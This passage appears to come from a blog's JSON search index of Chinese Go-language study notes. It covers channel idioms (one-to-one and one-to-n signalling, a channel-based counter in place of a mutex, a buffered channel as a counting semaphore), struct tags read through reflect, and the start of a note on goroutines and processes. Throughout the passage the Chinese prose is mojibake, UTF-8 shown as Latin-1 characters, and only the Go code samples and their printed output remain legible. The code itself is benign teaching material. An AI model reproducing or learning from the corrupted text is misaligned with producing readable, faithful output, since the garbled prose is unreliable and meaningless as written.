é€’çš„æ—¶å€™ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼Œåˆ†åˆ«æ˜¯ 1 å¯¹ 1 é€šçŸ¥ä¿¡å·å’Œ 1 å¯¹ n é€šçŸ¥ä¿¡å·ã€‚ 1 å¯¹ 1 é€šçŸ¥ä¿¡å·1234567891011121314151617181920type signal struct&#123;&#125;func worker() &#123; println(\"worker is working...\") time.Sleep(1 * time.Second)&#125;func spawn(f func()) &lt;-chan signal &#123; c := make(chan signal) go func() &#123; println(\"worker start to work...\") f() c &lt;- signal(struct&#123;&#125;&#123;&#125;) &#125;() return c&#125;func main() &#123; println(\"start a worker...\") c := spawn(worker) &lt;-c fmt.Println(\"worker work done!\")&#125; è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºä»¥ä¸‹ç»“æœï¼š 1234start a worker...worker start to work...worker is working...worker work done! è¿™é‡Œä¹‹æ‰€ä»¥ä¼šæ‰§è¡Œ worker å‡½æ•°ï¼ˆworker å‡½æ•°æ˜¯åœ¨ æ–°çš„goroutineå†…çš„ï¼‰ã€‚ spawn å‡½æ•°è¿”å›çš„ channel ç›¸å½“äºæ˜¯ä¸€ä¸ªæ–° goroutine åˆ›å»ºçš„â€œé€šçŸ¥ä¿¡å·â€ï¼Œåˆ©ç”¨æ— ç¼“å†²channel çš„ç‰¹æ€§ï¼Œå¯¹æ— ç¼“å†² channel çš„æ¥æ”¶å’Œå‘é€æ“ä½œæ˜¯åŒæ­¥çš„ï¼Œåªæœ‰åŒæ—¶å…·å¤‡æ¥æ”¶å’Œå‘é€èƒ½åŠ›æ‰ä¼šç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼Œå› æ­¤ä¸€å®šæ˜¯æ–°çš„ goroutine å…ˆæ‰§è¡Œå®Œæˆï¼Œç„¶åæ‰æ˜¯ main goroutine æ‰§è¡Œå®Œæˆã€‚ 1 å¯¹ n é€šçŸ¥ä¿¡å·æœ‰äº›æ—¶å€™ï¼Œæ— ç¼“å†² channel è¿˜è¢«ç”¨æ¥å®ç° 1 å¯¹ n çš„ä¿¡å·é€šçŸ¥æœºåˆ¶ã€‚è¿™æ ·çš„ä¿¡å·é€šçŸ¥æœºåˆ¶ï¼Œå¸¸è¢«ç”¨äºåè°ƒå¤šä¸ª Goroutine ä¸€èµ·å·¥ä½œï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š 12345678910111213141516171819202122232425262728293031323334353637type signal struct&#123;&#125;func worker(i int) &#123; fmt.Printf(\"worker %d: is working...\\n\", i) time.Sleep(1 * time.Second) fmt.Printf(\"worker %d: works done\\n\", i)&#125;func spawnGroup(f func(i int), num int, groupSignal &lt;-chan signal) &lt;-chan signal &#123; c := make(chan signal) var wg sync.WaitGroup for i := 0; i &lt; num; i++ &#123; wg.Add(1) go func(i int) &#123; &lt;-groupSignal fmt.Printf(\"worker %d: start to work...\\n\", i) f(i) wg.Done() &#125;(i + 1) &#125; go func() &#123; wg.Wait() c &lt;- signal(struct&#123;&#125;&#123;&#125;) &#125;() return c&#125;func main() &#123; fmt.Println(\"start a group of workers...\") groupSignal := make(chan signal) time.Sleep(5 * time.Second) c := spawnGroup(worker, 5, groupSignal) fmt.Println(\"the group of workers start to work...\") close(groupSignal) &lt;-c fmt.Println(\"the group of workers work done!\")&#125; åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œmain goroutine åˆ›å»ºäº†ä¸€ç»„ 5 ä¸ª worker goroutineï¼Œè¿™äº› Goroutine å¯åŠ¨åä¼šé˜»å¡åœ¨åä¸º groupSignal çš„æ— ç¼“å†² channel ä¸Šã€‚ main goroutine é€šè¿‡ close(groupSignal)å‘æ‰€æœ‰ worker goroutine å¹¿æ’­â€œå¼€å§‹å·¥ä½œâ€çš„ä¿¡å·ï¼Œæ”¶åˆ°ä¿¡å·åï¼Œæ‰€æœ‰ worker goroutine ä¼šâ€œåŒæ—¶â€å¼€å§‹å·¥ä½œï¼Œä¹Ÿå°±æ‰“å°å‡ºäº†ç»“æœã€‚ è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºä»¥ä¸‹ç»“æœï¼š 123456789101112131415161718start a group of workers...the group of workers start to work...worker 1: start to work...worker 1: is working...worker 2: start to work...worker 2: is working...worker 3: start to work...worker 3: is working...worker 4: start to work...worker 4: is working...worker 5: start to work...worker 5: is working...worker 5: works doneworker 2: works doneworker 1: works doneworker 3: works doneworker 4: works donethe group of workers work done! æ›¿ä»£é”æœºåˆ¶æ— ç¼“å†² channel å…·æœ‰åŒæ­¥ç‰¹æ€§ï¼Œè¿™è®©å®ƒåœ¨æŸäº›åœºåˆå¯ä»¥æ›¿ä»£é”ï¼Œè®©æˆ‘ä»¬çš„ç¨‹åºæ›´åŠ æ¸…æ™°ï¼Œå¯è¯»æ€§ä¹Ÿæ›´å¥½ã€‚æˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¸‹ä¸¤ä¸ªæ–¹æ¡ˆï¼Œç›´è§‚åœ°æ„Ÿå—ä¸€ä¸‹ã€‚ é¦–å…ˆçœ‹ä¸‹ä¼ ç»ŸåŸºäºâ€œå…±äº«å†…å­˜â€+â€œäº’æ–¥é”â€çš„ Goroutine å®‰å…¨çš„è®¡æ•°å™¨çš„å®ç°ï¼š 1234567891011121314151617181920212223type counter struct &#123; sync.Mutex i int&#125;var cter counterfunc Increase() int &#123; cter.Lock() defer cter.Unlock() cter.i++ return cter.i&#125;func main() &#123; var wg sync.WaitGroup for i := 0; i &lt; 10; i++ &#123; wg.Add(1) go func(i int) &#123; v := Increase() fmt.Printf(\"goroutine-%d: current counter value is %d\\n\", i, v) wg.Done() &#125;(i) &#125; wg.Wait()&#125; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œä½¿ç”¨äº†ä¸€ä¸ªå¸¦æœ‰äº’æ–¥é”ä¿æŠ¤çš„å…¨å±€å˜é‡ä½œä¸ºè®¡æ•°å™¨ï¼Œæ‰€æœ‰è¦æ“ä½œè®¡æ•°å™¨çš„ Goroutine å…±äº«è¿™ä¸ªå…¨å±€å˜é‡ï¼Œå¹¶åœ¨äº’æ–¥é”çš„åŒæ­¥ä¸‹å¯¹è®¡æ•°å™¨è¿›è¡Œè‡ªå¢æ“ä½œã€‚ æ¥ä¸‹æ¥å†çœ‹æ›´ç¬¦åˆ Go è®¾è®¡æƒ¯ä¾‹çš„å®ç°ï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨æ— ç¼“å†² channel æ›¿ä»£é”åçš„å®ç°ï¼š 1234567891011121314151617181920212223242526272829303132type counter struct &#123; c chan int i int&#125;func NewCounter() *counter &#123; cter := &amp;counter&#123; c: make(chan int), &#125; go func() &#123; for &#123; cter.i++ cter.c &lt;- cter.i &#125; &#125;() return cter&#125;func (cter *counter) Increase() int &#123; return &lt;-cter.c&#125;func main() &#123; cter := NewCounter() var wg sync.WaitGroup for i := 0; i &lt; 10; i++ &#123; wg.Add(1) go func(i int) &#123; v := cter.Increase() fmt.Printf(\"goroutine-%d: current counter value is %d\\n\", i, v) wg.Done() &#125;(i) &#125; wg.Wait()&#125; åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œå°†è®¡æ•°å™¨æ“ä½œå…¨éƒ¨äº¤ç»™ä¸€ä¸ªç‹¬ç«‹çš„ Goroutine å»å¤„ç†ï¼Œå¹¶é€šè¿‡æ— ç¼“å†² channel çš„åŒæ­¥é˜»å¡çš„ç‰¹æ€§ï¼Œå®ç°è®¡æ•°å™¨çš„æ§åˆ¶ã€‚è¿™æ ·å…¶ä»– Goroutine é€šè¿‡ Increase å‡½æ•°è¯•å›¾å¢åŠ è®¡æ•°å™¨å€¼çš„åŠ¨ä½œï¼Œå®è´¨ä¸Šå°±è½¬åŒ–ä¸ºäº†ä¸€æ¬¡æ— ç¼“å†² channel çš„æ¥æ”¶åŠ¨ä½œã€‚ è¿™ç§å¹¶å‘è®¾è®¡é€»è¾‘æ›´ç¬¦åˆ Go è¯­è¨€æ‰€å€¡å¯¼çš„â€œä¸è¦é€šè¿‡å…±äº«å†…å­˜æ¥é€šä¿¡ï¼Œè€Œæ˜¯é€šè¿‡é€šä¿¡æ¥å…±äº«å†…å­˜â€çš„åŸåˆ™ã€‚ è¿è¡Œä¸Šé¢çš„ç¤ºä¾‹ä»£ç ï¼Œå¯ä»¥å¾—åˆ°å’Œäº’æ–¥é”æ–¹æ¡ˆç›¸åŒçš„è¾“å‡ºï¼š 12345678910goroutine-9: current counter value is 10goroutine-0: current counter value is 1goroutine-6: current counter value is 7goroutine-2: current counter value is 3goroutine-8: current counter value is 9goroutine-4: current counter value is 5goroutine-5: current counter value is 6goroutine-1: current counter value is 2goroutine-7: current counter value is 8goroutine-3: current counter value is 4 å¸¦ç¼“å†² channel çš„æƒ¯ç”¨æ³•å¸¦ç¼“å†²çš„ channel ä¸æ— ç¼“å†²çš„ channel æœ€å¤§çš„ä¸åŒä¹‹å¤„ï¼Œ å°±åœ¨äºå®ƒçš„å¼‚æ­¥æ€§ã€‚ å¯¹ä¸€ä¸ªå¸¦ç¼“å†²çš„ channelï¼Œåœ¨ç¼“å†²åŒºæœªæ»¡çš„æƒ…å†µä¸‹ï¼Œå¯¹å®ƒè¿›è¡Œå‘é€æ“ä½œçš„ Goroutine ä¸ä¼šé˜»å¡æŒ‚èµ·; åœ¨ç¼“å†²åŒºæœ‰æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå¯¹ä»–è¿›è¡Œæ¥æ”¶æ“ä½œçš„ Goroutine ä¹Ÿä¸ä¼šé˜»å¡æŒ‚èµ·ã€‚ æ— è®ºæ˜¯ 1 æ”¶ 1 å‘è¿˜æ˜¯å¤šæ”¶å¤šå‘ï¼Œå¸¦ç¼“å†² channel çš„æ”¶å‘æ€§èƒ½éƒ½è¦å¥½äºæ— ç¼“å†² channelï¼› å¯¹äºå¸¦ç¼“å†² channel è€Œè¨€ï¼Œå‘é€ä¸æ¥æ”¶çš„ Goroutine æ•°é‡è¶Šå¤šï¼Œæ”¶å‘æ€§èƒ½ä¼šæœ‰æ‰€ä¸‹é™ï¼› å¯¹äºå¸¦ç¼“å†² channel è€Œè¨€ï¼Œé€‰æ‹©é€‚å½“å®¹é‡ä¼šåœ¨ä¸€å®šç¨‹åº¦ä¸Šæå‡æ”¶å‘æ€§èƒ½ã€‚ ç”¨ä½œè®¡æ•°ä¿¡å·é‡Go å¹¶å‘è®¾è®¡çš„ä¸€ä¸ªæƒ¯ç”¨æ³•ï¼Œå°±æ˜¯å°†å¸¦ç¼“å†² channel ç”¨ä½œè®¡æ•°ä¿¡å·é‡ï¼ˆcounting semaphoreï¼‰ã€‚ å¸¦ç¼“å†² channel ä¸­çš„å½“å‰æ•°æ®ä¸ªæ•°ä»£è¡¨çš„æ˜¯ï¼Œå½“å‰åŒæ—¶å¤„äºæ´»åŠ¨çŠ¶æ€ï¼ˆå¤„ç†ä¸šåŠ¡ï¼‰çš„ Goroutine çš„æ•°é‡ï¼Œè€Œå¸¦ç¼“å†² channel çš„å®¹é‡ï¼ˆcapacityï¼‰ï¼Œå°±ä»£è¡¨äº†å…è®¸åŒæ—¶å¤„äºæ´»åŠ¨çŠ¶æ€çš„ Goroutine çš„æœ€å¤§æ•°é‡ã€‚ å‘å¸¦ç¼“å†² channel çš„ä¸€ä¸ªå‘é€æ“ä½œè¡¨ç¤ºè·å–ä¸€ä¸ªä¿¡å·é‡ï¼Œè€Œä» channel çš„ä¸€ä¸ªæ¥æ”¶æ“ä½œåˆ™è¡¨ç¤ºé‡Šæ”¾ä¸€ä¸ªä¿¡å·é‡ã€‚ 12345678910111213141516171819202122var active = make(chan struct&#123;&#125;, 3)var jobs = make(chan int, 10)func main() &#123; go func() &#123; for i := 0; i &lt; 8; i++ &#123; jobs &lt;- (i + 1) &#125; close(jobs) &#125;() var wg sync.WaitGroup for j := range jobs &#123; wg.Add(1) go func(j int) &#123; active &lt;- struct&#123;&#125;&#123;&#125; log.Printf(\"handle job: %d\\n\", j) time.Sleep(2 * time.Second) &lt;-active wg.Done() &#125;(j) &#125; wg.Wait()&#125; è¿è¡Œç¤ºä¾‹ä»£ç ï¼Œè¾“å‡ºå¦‚ä¸‹ï¼š 123456782022/11/11 10:03:07 handle job: 22022/11/11 10:03:07 handle job: 82022/11/11 10:03:07 handle job: 12022/11/11 10:03:09 handle job: 32022/11/11 10:03:09 handle job: 42022/11/11 10:03:09 handle job: 62022/11/11 10:03:11 handle job: 72022/11/11 10:03:11 handle job: 5 ä»ç¤ºä¾‹è¿è¡Œç»“æœä¸­çš„æ—¶é—´æˆ³ä¸­ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè™½ç„¶åˆ›å»ºäº†å¾ˆå¤š Goroutineï¼Œä½†ç”±äºè®¡æ•°ä¿¡å·é‡çš„å­˜åœ¨ï¼ŒåŒä¸€æ—¶é—´å†…å¤„ç†æ´»åŠ¨çŠ¶æ€ï¼ˆæ­£åœ¨å¤„ç† jobï¼‰çš„ Goroutine çš„æ•°é‡æœ€å¤šä¸º 3 ä¸ªã€‚ æ€»ç»“ channel æ˜¯ç”¨äº goroutine é—´é€šä¿¡çš„ é€šè¿‡é¢„å®šä¹‰å‡½æ•° makeï¼Œå¯ä»¥åˆ›å»ºä¸¤ç±» channel æ— ç¼“å†² channel å…·å¤‡é€šä¿¡ä¸åŒæ­¥ç‰¹æ€§ï¼Œå¸¸ç”¨äºä½œä¸ºä¿¡å·é€šçŸ¥æˆ–æ›¿ä»£åŒæ­¥é” å¸¦ç¼“å†² channel å…·å¤‡å¼‚æ­¥æ€§ï¼Œæ›´é€‚åˆç”¨æ¥å®ç°åŸºäºå†…å­˜çš„æ¶ˆæ¯é˜Ÿåˆ—ã€è®¡æ•°ä¿¡å·é‡ç­‰ å‚è€ƒé“¾æ¥ Tony Bai Â· Go è¯­è¨€ç¬¬ä¸€è¯¾","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”ç»“æ„ä½“æ ‡ç­¾","slug":"go-language-study-notes-struct-tag","date":"2022-11-06T14:47:05.000Z","updated":"2023-02-18T03:28:33.595Z","comments":true,"path":"go-language-study-notes-struct-tag/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-struct-tag/","excerpt":"ç»“æ„ä½“æ ‡ç­¾å°±æ˜¯å¯¹ç»“æ„ä½“å­—æ®µçš„é¢å¤–ä¿¡æ¯è¡¥å……ã€‚","text":"ç»“æ„ä½“æ ‡ç­¾å°±æ˜¯å¯¹ç»“æ„ä½“å­—æ®µçš„é¢å¤–ä¿¡æ¯è¡¥å……ã€‚ å®šä¹‰ç»“æ„ä½“æ ‡ç­¾ç»“æ„ä½“æ ‡ç­¾çš„å®šä¹‰æ–¹å¼æ˜¯ï¼Œåœ¨å­—æ®µå£°æ˜åé¢å¯ä»¥è·Ÿä¸€ä¸ªå¯é€‰çš„å­—ç¬¦ä¸²æ–‡å­—ã€‚ 12345678type T struct &#123; f1 string \"f one\" f2 string f3 string `f three` f4, f5 int64 `f four and five` f6 string `key1:\"value1\" key1:\"value2\"` f7 string \"json:\\\"f7\\\"\" // å¯è¯»æ€§å¾ˆä½&#125; é€šå¸¸ä½¿ç”¨ ` åå¼•å·æ¥å®šä¹‰ç»“æ„ä½“æ ‡ç­¾ï¼Œä¾‹å¦‚ä¸Šé¢ç»“æ„ä½“ T çš„ f6 å­—æ®µã€‚ ä¸ºä»€ä¹ˆè¯´æ˜¯é€šå¸¸å‘¢ï¼Ÿå…¶å®ä¹Ÿå¯ä»¥ä½¿ç”¨åŒå¼•å·å»å®šä¹‰ï¼Œä½†æ˜¯é‡åˆ°éœ€è¦è½¬ä¹‰æ—¶ï¼Œå°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œå¼€å‘è€…æ€»æ˜¯éœ€è¦å»å…³å¿ƒå¦‚ä½•è½¬ä¹‰çš„é—®é¢˜ï¼Œè€Œä½¿ç”¨åå¼•å·åˆ™å®Œå…¨ä¸ç”¨æ‹…å¿ƒè¿™ä¸ªé—®é¢˜ã€‚ å› æ­¤ç»å¤§å¤šæ•°æƒ…å†µéƒ½æ˜¯åå¼•å·å»å®šä¹‰çš„ã€‚ ä»ç»“æ„ä½“æ ‡ç­¾è·å–å€¼ä¸Šé¢æåˆ°äº†ï¼Œç»“æ„ä½“å­—æ®µåªéœ€è¦åœ¨å­—æ®µå£°æ˜åé¢è·Ÿä¸Šå­—ç¬¦ä¸²å°±è¡Œï¼Œä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä¸ä¼šè·Ÿä¸€ä¸ªæ¯«æ— è§„åˆ™çš„å­—ç¬¦ä¸²ï¼Œå› ä¸ºè¿™æ ·æ²¡æœ‰æ„ä¹‰ã€‚ å¾€å¾€ä¼šè¿™æ ·å®šä¹‰ä¸€ä¸ªç»“æ„ä½“æ ‡ç­¾ï¼šç”±ä¸€ä¸ªæˆ–å¤šä¸ªé”®å€¼å¯¹ç»„æˆã€‚é”®ä¸å€¼ä½¿ç”¨å†’å·åˆ†éš”ï¼Œå€¼ç”¨åŒå¼•å·æ‹¬èµ·æ¥ã€‚é”®å€¼å¯¹ä¹‹é—´ä½¿ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†éš”ï¼Œä¾‹å¦‚ï¼škey1:&quot;value1&quot; key2:&quot;value2&quot;ã€‚ æ ‡ç­¾å¯é€šè¿‡ reflectï¼ˆåå°„ï¼‰ åŒ…è®¿é—®ï¼Œå› ä¸ºè¿™äº›ä¿¡æ¯æ˜¯é™æ€çš„ï¼Œå› æ­¤ä¸éœ€è¦å®ä¾‹åŒ–ç»“æ„ä½“ï¼Œå°±èƒ½ç›´æ¥è·å–åˆ°ã€‚ ç»“æ„ä½“æ ‡ç­¾ä¸­å¸¸ç”¨çš„ä¸€äº›æ–¹æ³•ï¼š Getï¼šæ ¹æ® Tag ä¸­çš„é”®è·å–å¯¹åº”çš„å€¼ Lookupï¼šæ ¹æ® Tag ä¸­çš„é”®ï¼ŒæŸ¥è¯¢å€¼æ˜¯å¦å­˜åœ¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445type T struct &#123; f1 string \"f one\" f2 string f3 string `f three` f4, f5 int64 `f four and five` f6 string `key1: \"value1\" key1:\"value2\"` f7 string \"json:\\\"f7\\\"\"&#125;func main() &#123; t := reflect.TypeOf(T&#123;&#125;) f1, _ := t.FieldByName(\"f1\") fmt.Println(f1.Tag) // f one fmt.Println(f1.Tag.Get(\"f1\")) // f2, _ := t.FieldByName(\"f2\") fmt.Println(f2.Tag) // fmt.Println(f2.Tag.Get(\"\")) // f3, _ := t.FieldByName(\"f3\") fmt.Println(f3.Tag) // f three fmt.Println(f3.Tag.Get(\"f1\")) // f4, _ := t.FieldByName(\"f4\") fmt.Println(f4.Tag) // f four and five fmt.Println(f4.Tag.Get(\"f4\")) // f5, _ := t.FieldByName(\"f5\") fmt.Println(f5.Tag) // f four and five fmt.Println(f5.Tag.Get(\"f5\")) // // å¯ä»¥çœ‹åˆ°ä¸Šé¢éƒ¨åˆ†çš„å®ä¾‹ä»£ç ï¼Œé€šè¿‡ç»“æ„ä½“æ–¹æ³•è·å–ä¸åˆ°æœ‰æ•ˆçš„å€¼ // è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸ä¼šç›´æ¥è·Ÿä¸€ä¸ªå­—ç¬¦ä¸²çš„åŸå› ï¼Œå› ä¸ºç»“æ„ä½“æ ‡ç­¾çš„æ–¹æ³•åœ¨è¿™ç§æƒ…å†µä¸‹ä½œç”¨ä½“ç°ä¸å‡ºæ¥ f6, _ := t.FieldByName(\"f6\") fmt.Println(f6.Tag) // key1:\"value1\" key1:\"value2\" fmt.Println(f6.Tag.Get(\"key1\")) // value1 fmt.Println(f6.Tag.Lookup(\"key1\")) // value1 true f7, _ := t.FieldByName(\"f7\") fmt.Println(f7.Tag) // json:\"f7\" fmt.Println(f7.Tag.Get(\"json\")) // f7 fmt.Println(f7.Tag.Lookup(\"json\")) // f7 true&#125; ä¸€ä¸ªç»†èŠ‚éœ€è¦æ³¨æ„ ğŸ’¡ çš„æ˜¯ï¼šç¼–å†™ Tag æ—¶ï¼Œå¿…é¡»ä¸¥æ ¼éµå®ˆé”®å€¼å¯¹çš„è§„åˆ™ã€‚ ç»“æ„ä½“æ ‡ç­¾çš„è§£æä»£ç çš„å®¹é”™èƒ½åŠ›å¾ˆå·®ï¼Œä¸€æ—¦æ ¼å¼å†™é”™ï¼Œç¼–è¯‘å’Œè¿è¡Œæ—¶éƒ½ä¸ä¼šæç¤ºä»»ä½•é”™è¯¯ï¼Œä¾‹å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼š 123456789101112type cat struct &#123; Name string Type int `json: \"type\" id:\"100\"`&#125;func main() &#123; typeOfCat := reflect.TypeOf(cat&#123;&#125;) if catType, ok := typeOfCat.FieldByName(\"Type\"); ok &#123; fmt.Println(catType.Tag.Get(\"json\")) &#125;&#125; ä¸Šé¢çš„å®ä¾‹ä»£ç ï¼Œä¸€çœ¼çœ‹ä¸Šå»å¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜æ˜¯å§ï¼Ÿ ä½†æ˜¯å®é™…è¿è¡Œå¹¶ä¸ä¼šè¾“å‡ºæœŸæœ›çš„ typeï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç»“æ„ä½“æ ‡ç­¾è¿™ä¸€è¡Œï¼Œåœ¨json:å’Œâ€typeâ€ä¹‹é—´å¢åŠ äº†ä¸€ä¸ªç©ºæ ¼ã€‚è¿™ç§å†™æ³•æ²¡æœ‰éµå®ˆç»“æ„ä½“æ ‡ç­¾çš„è§„åˆ™ï¼Œå› æ­¤æ— æ³•é€šè¿‡ Tag.Get è·å–åˆ°æ­£ç¡®çš„ json å¯¹åº”çš„å€¼ã€‚ è¿™ä¸ªé”™è¯¯åœ¨å¼€å‘ä¸­éå¸¸å®¹æ˜“è¢«ç–å¿½ï¼Œé€ æˆéš¾ä»¥å¯Ÿè§‰çš„é”™è¯¯ã€‚ ç»“æ„ä½“æ ‡ç­¾æœ‰è®¸å¤šåº”ç”¨åœºæ™¯ï¼Œä¾‹å¦‚é…ç½®ç®¡ç†ï¼Œç»“æ„çš„é»˜è®¤å€¼ï¼ŒéªŒè¯ï¼Œå‘½ä»¤è¡Œå‚æ•°æè¿°ç­‰ï¼Œå¯ä»¥ä»è¿™ä¸ªåˆ—è¡¨ä¸­æŸ¥çœ‹åˆ°æœ‰å“ªäº›é¡¹ç›®ä½¿ç”¨äº†ç»“æ„ä½“æ ‡ç­¾ã€‚","categories":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/categories/Go/"}],"tags":[{"name":"Go","slug":"Go","permalink":"https://www.0x2beace.com/tags/Go/"}]},{"title":"Go è¯­è¨€å­¦ä¹ ç¬”è®°â€”â€”goroutine","slug":"go-language-study-notes-goroutine","date":"2022-11-05T15:24:24.000Z","updated":"2023-02-18T03:28:33.589Z","comments":true,"path":"go-language-study-notes-goroutine/","link":"","permalink":"https://www.0x2beace.com/go-language-study-notes-goroutine/","excerpt":"å¹¶å‘åŸè¯­ï¼ˆGoroutineã€channelã€selectï¼‰æ˜¯ Go çš„æ ¸å¿ƒï¼Œè¦å­¦å¥½ Go å¹¶å‘ï¼Œéœ€è¦å…·å¤‡ä¸€äº›æ“ä½œç³»ç»Ÿçš„åŸºç¡€çŸ¥è¯†ã€‚","text":"å¹¶å‘åŸè¯­ï¼ˆGoroutineã€channelã€selectï¼‰æ˜¯ Go çš„æ ¸å¿ƒï¼Œè¦å­¦å¥½ Go å¹¶å‘ï¼Œéœ€è¦å…·å¤‡ä¸€äº›æ“ä½œç³»ç»Ÿçš„åŸºç¡€çŸ¥è¯†ã€‚ æ‰€ä»¥æ­£å¼å­¦ä¹  Goroutine ä¹‹å‰ï¼Œå…ˆä»ä»€ä¹ˆæ˜¯å¹¶å‘è¯´èµ·ã€‚ ä»€ä¹ˆæ˜¯å¹¶å‘å¹¶å‘çš„æ¦‚å¿µï¼šä¸¤ä¸ªæˆ–è€…å¤šä¸ªäº‹æƒ…åœ¨åŒä¸€æ—¶é—´é—´éš”å†…å‘ç”Ÿã€‚ åœ¨å•æ ¸ CPU çš„æ—¶ä»£ï¼Œæ“ä½œç³»ç»Ÿçš„åŸºæœ¬è°ƒåº¦å’Œæ‰§è¡Œå•å…ƒæ˜¯è¿›ç¨‹ï¼ˆprocessï¼‰ï¼Œè®¡ç®—æœºå¯ä»¥â€œåŒæ—¶â€è¿è¡Œå¤šä¸ªç¨‹åºï¼Œéƒ½æ˜¯å› ä¸ºæ“ä½œç³»ç»Ÿçš„å¹¶å‘æ€§çš„å­˜åœ¨ã€‚è¿™äº›ç¨‹åºå®è§‚ä¸Šæ˜¯åŒæ—¶è¿è¡Œçš„ï¼Œè€Œå¾®è§‚ä¸Šåˆ™æ˜¯äº¤æ›¿è¿è¡Œçš„ã€‚ è¿™ä¸ªæ—¶å€™ï¼Œç”¨æˆ·å±‚çš„åº”ç”¨æœ‰ä¸¤ç§è®¾è®¡æ–¹å¼ï¼šå•è¿›ç¨‹å’Œå¤šè¿›ç¨‹ï¼Œä¸‹é¢ä¸€ä¸€ä»‹ç»ã€‚ å•è¿›ç¨‹ä¸€ä¸ªåº”ç”¨å¯¹åº”ä¸€ä¸ªè¿›ç¨‹ï¼Œæ“ä½œç³»ç»Ÿï¼ˆCPUï¼‰æ¯æ¬¡åªèƒ½ä¸ºä¸€ä¸ªè¿›ç¨‹è¿›è¡ŒæœåŠ¡ã€‚ å•è¿›ç¨‹åº”ç”¨çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å±‚åº”ç”¨ã€æ“ä½œç³»ç»Ÿè¿›ç¨‹ä»¥åŠå¤„ç†å™¨ä¹‹é—´çš„å…³ç³»æ˜¯è¿™æ ·çš„ï¼š å¯ä»¥çœ‹åˆ°ï¼Œå› ä¸º CPU åªæœ‰ä¸€ä¸ªï¼Œå› æ­¤CPU ä¼šè½®æµåœ°ä¸ºå„ä¸ªè¿›ç¨‹è¿›è¡ŒæœåŠ¡ï¼ŒCPU çš„è¿è¡Œé€Ÿåº¦éå¸¸å¿«ï¼Œæ‰€ä»¥å®è§‚ä¸Šè¿™äº›è¿›ç¨‹æ˜¯åŒæ—¶è¿è¡Œçš„ã€‚ æ€»çš„æ¥è¯´ï¼Œå•è¿›ç¨‹åº”ç”¨çš„è®¾è®¡æ¯”è¾ƒç®€å•ï¼Œå®ƒçš„å†…éƒ¨ä»…æœ‰ä¸€æ¡ä»£ç æ‰§è¡Œæµï¼Œä»£ç ä»å¤´æ‰§è¡Œåˆ°å°¾ï¼Œä¸å­˜åœ¨ç«æ€ï¼Œæ— éœ€è€ƒè™‘åŒæ­¥é—®é¢˜ã€‚ å¤šè¿›ç¨‹ä¸€ä¸ªåº”ç”¨å¯¹åº”å¤šä¸ªè¿›ç¨‹ï¼Œæ“ä½œç³»ç»Ÿï¼ˆCPUï¼‰ä»ç„¶æ¯æ¬¡åªèƒ½ä¸ºä¸€ä¸ªè¿›ç¨‹è¿›è¡ŒæœåŠ¡ã€‚ å¤šè¿›ç¨‹åº”ç”¨çš„æƒ…å†µä¸‹ï¼Œç”¨æˆ·å±‚åº”ç”¨ã€æ“ä½œç³»ç»Ÿè¿›ç¨‹ä»¥åŠå¤„ç†å™¨ä¹‹é—´çš„å…³ç³»æ˜¯è¿™æ ·çš„ï¼š å¯ä»¥çœ‹åˆ°ï¼ŒApp1 è¿™ä¸ªåº”ç”¨å†…éƒ¨åˆ’åˆ†äº†å¤šä¸ªæ¨¡å—ï¼Œæ¯ä¸€ä¸ªæ¨¡å—å†…å¯¹åº”ä¸€ä¸ªè¿›ç¨‹ï¼Œæ¯ä¸€ä¸ªæ¨¡å—éƒ½æ˜¯ä¸€ä¸ªå•ç‹¬çš„ä»£ç æ‰§è¡Œæµã€‚ ä½†æ˜¯å—é™äºå•æ ¸ CPUï¼Œè¿™äº›è¿›ç¨‹ä¾æ—§åªèƒ½å¹¶å‘è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è½®æµè¢«å•ä¸ªCPU æœåŠ¡ã€‚ è¿™æ ·çœ‹èµ·æ¥ï¼Œå¤šè¿›ç¨‹åº”ç”¨ä¸å•è¿›ç¨‹åº”ç”¨ç›¸æ¯”ï¼Œä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆè´¨çš„æå‡ï¼Œé‚£ä¸ºä»€ä¹ˆè¿˜è¦å°†åº”ç”¨è®¾è®¡æˆå¤šè¿›ç¨‹ï¼Ÿ è¿™æ˜¯å› ä¸ºï¼Œæ›´å¤šçš„æ˜¯ä»åº”ç”¨çš„ç»“æ„è§’åº¦å»è€ƒè™‘çš„ï¼Œå¤šè¿›ç¨‹åº”ç”¨å°†åŠŸèƒ½èŒè´£è¿›è¡Œäº†åˆ’åˆ†ï¼ˆæ¨¡å— 1 å¯¹åº” è¿›ç¨‹ 1ã€æ¨¡å—2 å¯¹åº”è¿›ç¨‹ 2 ï¼‰ï¼Œä»ç»“æ„ä¸Šæ¥çœ‹ï¼Œè¦æ¯”å•è¿›ç¨‹æ›´ä¸ºæ¸…æ™°ç®€æ´ï¼Œå¯è¯»æ€§ä¸å¯ç»´æŠ¤æ€§ä¹Ÿæ›´å¥½ã€‚ 